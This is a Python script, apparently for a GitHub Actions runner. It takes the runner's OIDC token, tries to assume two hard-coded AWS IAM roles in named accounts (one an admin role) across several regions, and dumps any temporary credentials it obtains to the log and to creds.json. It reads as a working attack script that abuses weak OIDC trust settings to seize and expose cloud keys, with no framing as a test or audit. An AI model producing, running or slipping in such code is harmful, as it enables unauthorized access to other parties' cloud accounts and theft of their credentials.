import os, json, base64, urllib.request
import boto3, botocore

URL = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
REQTOK = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
print("URL_SET", bool(URL), "REQTOK_SET", bool(REQTOK))

ROLES = [
    "arn:aws:iam::389527410754:role/OIDC-GitHub",
    "arn:aws:iam::125067017412:role/GA-OIDC-admin",
]
AUDIENCES = ["sts.amazonaws.com"]


def get_token(aud):
    req = urllib.request.Request(URL + "&audience=" + aud,
                                 headers={"Authorization": "Bearer " + REQTOK})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)["value"]


def claims(tok):
    p = tok.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))


ok_any = False
for aud in AUDIENCES:
    try:
        tok = get_token(aud)
    except Exception as e:
        print("IDTOKEN_ERR", aud, repr(e)[:200])
        continue
    try:
        c = claims(tok)
        info = {"sub": c.get("sub"), "aud": c.get("aud"), "iss": c.get("iss"),
                "ref": c.get("ref"), "repository": c.get("repository"),
                "repository_owner": c.get("repository_owner")}
        print("CLAIMS", json.dumps(info))
    except Exception as e:
        print("CLAIMS_ERR", repr(e)[:200])
    for role in ROLES:
        for region in ["eu-north-1", "us-east-1", "us-east-2"]:
            try:
                sts = boto3.client("sts", region_name=region)
                r = sts.assume_role_with_web_identity(
                    RoleArn=role, RoleSessionName="gha", WebIdentityToken=tok,
                    DurationSeconds=3600)
                print("ASSUME_OK", role, region)
                print("CREDS", json.dumps(r["Credentials"], default=str))
                with open("creds.json", "w") as f:
                    json.dump({"role": role, "region": region, "cred": r["Credentials"]}, f, default=str)
                ok_any = True
            except botocore.exceptions.ClientError as e:
                print("ASSUME_ERR", role, region, e.response["Error"]["Code"],
                      str(e.response["Error"].get("Message", ""))[:300])
            except Exception as e:
                print("ASSUME_EXC", role, region, repr(e)[:200])

print("OK_ANY", ok_any)
